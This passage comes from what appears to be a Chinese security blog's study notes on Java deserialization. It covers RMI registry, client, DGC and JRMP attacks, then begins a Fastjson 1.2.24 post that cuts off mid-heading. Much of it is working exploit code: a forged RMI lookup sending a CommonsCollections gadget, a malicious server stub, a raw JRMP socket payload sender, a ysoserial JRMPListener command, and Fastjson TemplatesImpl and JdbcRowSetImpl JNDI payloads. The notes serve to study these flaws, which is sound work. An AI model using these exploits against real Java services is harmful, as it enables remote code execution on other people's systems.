title="调用lookup&amp;unbind"></a>调用lookup&amp;unbind</h3><p>这两个只能传入String类型的参数</p><p>由于这俩是客户端调用的，所以他们肯定是要到RegistryImpl_Stub里的lookup方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123301488.png" alt="image-20230520123301488"></p><p>由于参数var1只能为String类，所以我们需要自己伪造实现lookup方法，并在<code>var3.writeObject(var1);</code>中将我们的恶意类传入。</p><p>首先获取ref对象，以下是RegistryImpl_Stub的继承图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123508569.png" alt="image-20230520123508569"></p><p>ref是RemoteObject的属性，我们可以通过反射调用来获取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123540259.png" alt="image-20230520123540259"></p><pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);declaredField.setAccessible(true);RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry);</code></pre><p>然后再去获得super.ref.newCall的参数operations</p><p>方式一样</p><pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);operations_field.setAccessible(true);Operation[] operations &#x3D; (Operation[])operations_field.get(registry);</code></pre><p>然后就是伪造这一部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520125250620.png" alt="image-20230520125250620"></p><p>完整poc为</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIClient &#123;    public static void main(String[] args) throws Exception &#123;&#x2F;&#x2F;        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:7777&#x2F;&quot;);&#x2F;&#x2F;        evil evil &#x3D; new evil();        Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1097);&#x2F;&#x2F;        IRemoteObj remoteObj &#x3D; (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);&#x2F;&#x2F;获取ref        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);        declaredField.setAccessible(true);        RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry);     &#x2F;&#x2F;获取 operations          Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);        operations_field.setAccessible(true);        Operation[] operations &#x3D; (Operation[])operations_field.get(registry);        Object o &#x3D; cc1.cc1exp();&#x2F;&#x2F;伪造lookup        RemoteCall var2 &#x3D; ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);        ObjectOutput var3 &#x3D; var2.getOutputStream();        var3.writeObject(o);        ref.invoke(var2);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520131630621.png" alt="image-20230520131630621"></p><p>攻击完成，这其实就是绕过系统自带的lookup方法，自己写一个lookup，然后就可以随意传参了。</p><p>而且只需要重写到<code>super.ref.invoke(var2);</code>就行，毕竟我们只需要在注册中心的服务端调用<code>RegistryImpl_Skel#dispatch</code>然后执行我们的恶意代码。</p><h2 id="攻击客户端-1"><a href="#攻击客户端-1" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><p>对于客户端来说，有两个反序列化并可以被利用的地方</p><ul><li>从 Registry 端获取调用服务的 stub 并反序列化</li><li>调用服务后获取结果并反序列化</li></ul><h3 id="恶意Server-Stub"><a href="#恶意Server-Stub" class="headerlink" title="恶意Server Stub"></a>恶意Server Stub</h3><p>这个和服务端攻击注册中心的方式差不多（整体上来看</p><p>在服务端攻击注册中心的地方我们提到，由于服务端和注册中心在一起，倘若不使用getRegistry，则反序列化不会触发。</p><p>但是现在来看，如果不触发，Client端调用lookup进行服务发现时，会拿到Server端在Registry端注册的恶意代理对象并进行反序列化。</p><p>所以代码都是差不多的，只是直接用<code>LocateRegistry.createRegistry(1098);</code>获取注册中心就行</p><p>客户端就正常客户端</p><p>服务端代码为</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;    public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;        &#x2F;&#x2F;创建远程对象        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();        &#x2F;&#x2F;创建注册中心        Registry registry &#x3D; LocateRegistry.createRegistry(1097);        Object o &#x3D; cc1.cc1exp();        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);        HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;ethe&quot;,o);        declaredConstructor.setAccessible(true);        InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map);        Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1);        registry.bind(&quot;iRemoteObj&quot;,remote);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520142100636.png" alt="image-20230520142100636"></p><p>这也就是RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端的路线</p><h3 id="恶意Server端返回值"><a href="#恶意Server端返回值" class="headerlink" title="恶意Server端返回值"></a>恶意Server端返回值</h3><p>根据我们之前的一些分析，我们知道，服务端会反序列化客户端传过来的参数，导致了恶意服务参数攻击。</p><p>同样，客户端也会反序列化服务端返回的值，造成恶意Server端返回值攻击</p><p>这里客户端和服务端都可以用正常的代码，修改实现类就行</p><pre class="language-java" data-language="java"><code class="language-java">public Object sayHello(String a) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;    String name &#x3D; this.getClass().getName();    System.out.println(a);    Object o &#x3D; cc1.cc1exp();    return o;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520144136035.png" alt="image-20230520144136035"></p><h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><p>和攻击服务端的一样，把角色换过来就好了，感觉没啥说的</p><h2 id="攻击DGC"><a href="#攻击DGC" class="headerlink" title="攻击DGC"></a>攻击DGC</h2><p>在前言里我们还提到了用DGCImpl_Skel#dispatch和DGCImpl_Stub#dirty攻击服务端和客户端的路线</p><p>它的通信过程是<strong>Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理</strong>。</p><h3 id="DGC客户端打DGC服务端"><a href="#DGC客户端打DGC服务端" class="headerlink" title="DGC客户端打DGC服务端"></a>DGC客户端打DGC服务端</h3><p>DGC之间的通信也是借助序列化和反序列化的，我们只需要构造一个DGC通信并在指定的位置写入序列化恶意类，经由DGC传输到DGC服务端，从而触发反序列化。</p><p>同时，由于 DGC 通信和 RMI 通信在 Transport 层是同样的处理逻辑，只不过根据 Client 端写入的标记ObjID(在初始化LiveRef的时候创建，DGC的ObjID是特定的<code>new ObjID(2);</code>)来区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理</p><p>(这块没太懂，主要是没找到区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理的代码)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520163947253.png" alt="image-20230520163947253"></p><p>然后思路就是通过控制id值，让服务端误认为这个是DGC的东西，然后进入DGCImpl_Skel 里去触发漏洞点</p><pre class="language-java" data-language="java"><code class="language-java">public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException &#123;  InetSocketAddress isa &#x3D; new InetSocketAddress(hostname, port);  Socket s &#x3D; null;  DataOutputStream dos &#x3D; null;  try &#123;    &#x2F;&#x2F; 在TCP(Transport)层获取连接    s &#x3D; SocketFactory.getDefault().createSocket(hostname, port);    s.setKeepAlive(true);    s.setTcpNoDelay(true);    &#x2F;&#x2F; 取出数据流OutputStream，这里对着类似的writeObject方法来看    OutputStream os &#x3D; s.getOutputStream();    dos &#x3D; new DataOutputStream(os);    &#x2F;&#x2F; 写一些TCP传输的必要标志    dos.writeInt(TransportConstants.Magic);    dos.writeShort(TransportConstants.Version);    dos.writeByte(TransportConstants.SingleOpProtocol);    dos.write(TransportConstants.Call);    @SuppressWarnings ( &quot;resource&quot; )    &#x2F;&#x2F; 下面才是真正的对应到代码层面，从TCPTransport#handleMessages方法开始    final ObjectOutputStream objOut &#x3D; new MarshalOutputStream(dos);    &#x2F;&#x2F; 写ObjID，2代表DGC，后面接着3个代表随机数，随便写    &#x2F;&#x2F; 对应sun.rmi.transport.Transport#serviceCall方法中的    &#x2F;&#x2F; var39 &#x3D; ObjID.read(var1.getInputStream());    objOut.writeLong(2); &#x2F;&#x2F; DGC    objOut.writeInt(0);    objOut.writeLong(0);    objOut.writeShort(0);    &#x2F;&#x2F; 选择DGCImpl的操作，dirty或clean都可以    &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#dispatch方法中的    &#x2F;&#x2F; int var3 &#x3D; var39.readInt();    objOut.writeInt(1); &#x2F;&#x2F; dirty    &#x2F;&#x2F; 写DGC接口的hash，值就是-669196253586618813L    &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#oldDispatch中的    &#x2F;&#x2F; var4 &#x3D; var18.readLong();    &#x2F;&#x2F; 以及sun.rmi.transport.DGCImpl_Skel#dispatch中的判断    objOut.writeLong(-669196253586618813L);    objOut.writeObject(payloadObject);    os.flush();  &#125;  finally &#123;    if ( dos !&#x3D; null ) &#123;      dos.close();    &#125;    if ( s !&#x3D; null ) &#123;      s.close();    &#125;  &#125;&#125;</code></pre><p>原理懂了，代码写不出来<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/QVJIZ6DSFAY9Y0PP@Q_2%7D8R.gif" alt="img"></p><p>抄一下其他人的做的图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/20200622140434-3edd6486-b44e-1.png" alt="20200622140434-3edd6486-b44e-1"></p><p>这个攻击手段<strong>实际上就是 ysoserial 中的 ysoserial.exploit.JRMPClient 的实现原理</strong></p><p>DGC其实客户端、注册中心、服务端都能打，但是因为只有注册中心的端口是确认的，所以一般都是打注册中心</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520165828619.png" alt="image-20230520165828619"></p><p>调用链</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520170306699.png" alt="image-20230520170306699"></p><p>ysoserial里用的是使用socket重写了JRMP协议，这里还有另一种方式，就是获取DGCImpl_Stub对象，重写dirty方法，在DGCImpl_Skel#dispatch中触发反序列化，跟打注册中心的差不多</p><p>就跟客户端攻击注册中心的时候重写lookup差不多</p><h3 id="DGC服务端打客户端"><a href="#DGC服务端打客户端" class="headerlink" title="DGC服务端打客户端"></a>DGC服务端打客户端</h3><p>同样的道理可以用DGC服务端打客户端，在DGCImpl_Stub触发反序列化。但是既然最后调用的都是call.executeCall();，那为啥不用UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端这条路呢。这篇没提这条链，是因为他还有更重要的使命（</p><h2 id="攻击JRMP客户端"><a href="#攻击JRMP客户端" class="headerlink" title="攻击JRMP客户端"></a>攻击JRMP客户端</h2><p>前面分析过，只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，假设在异常处理的时候满足了那个判断，就会导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，其实这就是ysoserial里面的exploit/JRMPListener实现的功能。具体实现大概就是从TCPTransport#run0拷过来，没用的删删，改改最后处理的地方。<br>具体使用是先启动监听</p><p><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe</code></p><p>然后启用客户端去向这个恶意服务端端发起请求</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521142412750.png" alt="image-20230521142412750"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/vuls/346762.html">https://www.freebuf.com/vuls/346762.html</a></p><p><a href="https://xz.aliyun.com/t/7930">https://xz.aliyun.com/t/7930</a></p><p><a href="https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/">https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/</a></p><p><a href="https://goodapple.top/archives/520">https://goodapple.top/archives/520</a></p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/">RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue</a></p><p><a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">Java 安全-RMI学习总结 (townmacro.cn)</a></p><p><a href="https://paper.seebug.org/1091/#serverrmi-server">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化</title>
      <link href="/2023/05/07/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/07/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.23<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h1 id="Fastjson概述"><a href="#Fastjson概述" class="headerlink" title="Fastjson概述"></a>Fastjson概述</h1><p>FastJson是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象</p><p>这里列举一些 fastjson 功能要点：</p><ul><li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li><li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li><li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</li><li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li><li>fastjson 在为类属性寻找 get/set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li><li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>先建一个javabean</p><pre class="language-java" data-language="java"><code class="language-java">public class javaBean &#123;    private String name;    private int id;    public javaBean()&#123;        System.out.println(&quot;无参构造&quot;);    &#125;    public javaBean(String name, int id) &#123;        this.name &#x3D; name;        this.id &#x3D; id;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, id&#x3D;&quot; + id +                &#39;&#125;&#39;;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name &#x3D; name;    &#125;    public int getId() &#123;        return id;    &#125;    public void setId(int id) &#123;        System.out.println(&quot;setId&quot;);        this.id &#x3D; id;    &#125;&#125;</code></pre><p>然后可以使用JSON的<code>toJSONString</code>方法 将对象转换为字符串</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507175656907.png" alt="image-20230507175656907"></p><p>但是这样得到的json格式的字符串只有属性的内容，不能区分出属于哪一个类，因此<code>toJSONString</code>方法还有第二个参数<code>SerializerFeature.WriteClassName</code></p><blockquote><p>传入<code>SerializerFeature.WriteClassName</code>可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507175837755.png" alt="image-20230507175837755"></p><p>这时的json中就有@type这个键，其值就是转换为json字符串的Java类</p><p>当然也可以把JSON 字符串转换为 Java 对象</p><p>使用<code>JSON.parse</code>或者<code>JSON.parseObject</code>可以把JSON 字符串转换为 Java 对象</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507181201385.png" alt="image-20230507181201385"></p><p><code>JSON.parseObject</code>方法中没指定对象，返回的则是<code>JSONObject</code>的对象。<code>JSON.parseObject</code>和 <code>JSON.parse</code>这两个方法差不多，<code>JSON.parseObject</code>的底层调用的还是<code>JSON.parse</code>方法，只是在<code>JSON.parse</code>的基础上做了一个封装。</p><p>这种把对象转化为json字符串，再把字符串转换为java对象的过程其实也是一种序列化和反序列化</p><p><strong>在序列化时，<code>FastJson</code>会调用成员对应的<code>get</code>方法，被<code>private</code>修饰且没有<code>get</code>方法的成员不会被序列化，</strong></p><p>而反序列化的时候在，会调用了指定类的全部的<code>setter</code>，<code>publibc</code>修饰的成员全部赋值。</p><h1 id="Fastjson1-2-24-版本漏洞复现"><a href="#Fastjson1-2-24-版本漏洞复现" class="headerlink" title="Fastjson1.2.24 版本漏洞复现"></a>Fastjson1.2.24 版本漏洞复现</h1><p>漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p><h2 id="漏洞攻击方式"><a href="#漏洞攻击方式" class="headerlink" title="漏洞攻击方式"></a>漏洞攻击方式</h2><p>@type 指定类<br>使用<code>JSON.parse</code>方法反序列化会调用此类的set方法<br>使用<code>JSON.parseObject</code>方法反序列化会调用此类get和set方法<br>可以写一个恶意类，然后通过这一特性实现命令执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507212130217.png" alt="image-20230507212130217"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507212119172.png" alt="image-20230507212119172"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="parseObject流程"><a href="#parseObject流程" class="headerlink" title="parseObject流程"></a>parseObject流程</h3><p>在正式复现漏洞之前，先看看parseObject的执行流程</p><p>首先就能看出来parseObject其实就是调了一个parse然后进行了强制类型转换</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230508161820331.png" alt="image-20230508161820331"></p><h3 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h3><p>版本：fastjson &lt;= 1.2.24</p><p>说明：借助TemplatesImpl类实现漏洞利用</p><p>这个类在CC链和CB链里都出现过，这里就是用了CB的那条从getOutputProperties到defineClass的路</p><p>先试试能不能到getOutputProperties，因为只有JSON.parseObject才能调用属性的get方法，所有这里只能用JSON.parseObject，而且因为fastjson处理的时候会去掉下划线，所以这个getOutputProperties方法对应的就是_outputProperties属性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507213337271.png" alt="image-20230507213337271"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507213503408.png" alt="image-20230507213503408"></p><p>证明确实能过来，所以后边就简单多了，就是满足一些条件，让它能最终加载恶意字节码</p><p>找找加载字节码的路上有哪些if判断，首先是_name不能为空，_class为空</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507213559252.png" alt="image-20230507213559252"></p><p>然后是_bytecodes不能为空</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507213645315.png" alt="image-20230507213645315"></p><p>_tfactory也不能空</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507220349149.png" alt="image-20230507220349149"></p><p>最后就是加载的字节码内容是_bytecodes里的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507213909331.png" alt="image-20230507213909331"></p><p>这里<code>_outputProperties</code>和<code>_tfactory</code>是<code>HashMap</code>类型的成员变量，所以可以赋值成一个空的hashmap，然后<code>_name</code>随便赋个字符串类型的值，<code>_bytecodes</code>是数组类型的值，这里我们先不纠结<code>_bytecodes</code>里的内容，先把链子跑通再说</p><p>Fastjson默认只会反序列化public修饰的属性，因此由于outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发；</p><p>构造好的测试payload为</p><pre class="language-java" data-language="java"><code class="language-java">String text &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_bytecodes\&quot;:[\&quot;1111111\&quot;],\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;</code></pre><p>这里一定要注意顺序，因为我们要的是给所有的属性赋值完后再去执行反序列化链，因此_outputProperties必须放在最后面</p><p>调试一下发现已经走到defineClass里了，但是字节数组里没有值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507221113254.png" alt="image-20230507221113254"></p><p>这就是我们之前说的fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507222156589.png" alt="image-20230507222156589"></p><p>因为单纯的一个字符解不出来东西，导致出来的字节数组是空的</p><p>这也意味着我们要加载的恶意字节码必须经过base64加密后再传进去</p><p>这里就直接用cc3的时候的恶意字节码文件，然后对其进行base64加密</p><pre class="language-java" data-language="java"><code class="language-java">import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.util.Base64;import java.util.Base64.Encoder;public class base &#123;    public static void main(String args[]) &#123;        byte[] buffer &#x3D; null;        String filepath &#x3D; &quot;src&#x2F;main&#x2F;java&#x2F;loadclass&#x2F;cmd.class&quot;;        try &#123;            FileInputStream fis &#x3D; new FileInputStream(filepath);            ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream();            byte[] b &#x3D; new byte[1024];            int n;            while((n &#x3D; fis.read(b))!&#x3D;-1) &#123;                bos.write(b,0,n);            &#125;            fis.close();            bos.close();            buffer &#x3D; bos.toByteArray();        &#125;catch(Exception e) &#123;            e.printStackTrace();        &#125;        Encoder encoder &#x3D; Base64.getEncoder();        String value &#x3D; encoder.encodeToString(buffer);        System.out.println(value);    &#125;&#125;</code></pre><p>把得到的base64的结果放进_bytecodes里</p><p>执行即可</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230507222920375.png" alt="image-20230507222920375"></p><p><strong>总结</strong></p><p>其实主要都是CB链的部分，大部分内容在前边也都讲过了</p><h3 id="JdbcRowSetImpl-链"><a href="#JdbcRowSetImpl-链" class="headerlink" title="JdbcRowSetImpl 链"></a>JdbcRowSetImpl 链</h3><p>这个就是基于JNDI注入的攻击方式，也是最常用的一种</p><p>和JNDI一样，有两种，一种是和RMI一起，另一种是和LDAP一起</p><h4 id="1-JNDI-RMI"><a href="#1-JNDI-RMI" class="headerlink" title="1. JNDI + RMI"></a>1. JNDI + RMI</h4><p>在JdbcRowSetImpl这个类里，有这么一个set方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524130414372.png" alt="image-20230524130414372"></p><p>设置数据库源</p><p>里面调用了父类的setDataSourceName方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524133345710.png" alt="image-20230524133345710"></p><p>这里面若name为空，则会对dataSource赋值，这个值我们可控。</p><p>然后再看JdbcRowSetImpl类里的setAutoCommit</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524134157752.png" alt="image-20230524134157752"></p><p>当conn为空时，会进入connect方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524134253621.png" alt="image-20230524134253621"></p><p>一个lookup方法，一个可控的url，完美的jndi注入点</p><p>而且这个conn在构造方法里，默认就是null</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524134424750.png" alt="image-20230524134424750"></p><p>然后就可以构造一下payload了</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;DataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,&quot;autoCommit&quot;:true&#125;</code></pre><p>再起一个基于rmi的JNDI服务端端</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524135938691.png" alt="image-20230524135938691"></p><h4 id="2-JNDI-LDAP"><a href="#2-JNDI-LDAP" class="headerlink" title="2. JNDI + LDAP"></a>2. JNDI + LDAP</h4><p>就改个url，其他的和RMI的一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524141121218.png" alt="image-20230524141121218"></p><p>贴个调用链，方便后边对比</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524142807132.png" alt="image-20230524142807132"></p><h1 id="Fastjson坎坷曲折的一生"><a href="#Fastjson坎坷曲折的一生" class="headerlink" title="Fastjson坎坷曲折的一生"></a>Fastjson坎坷曲折的一生</h1><p>自1.2.24版本出现了Fastjson的反序列化漏洞后，在之后几个版本，阿里不断的在对漏洞点进行修补，而安全研究者们也在不断的寻找绕过的手段（这真是，泰裤辣！</p><h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><h3 id="修复"><a href="#修复" 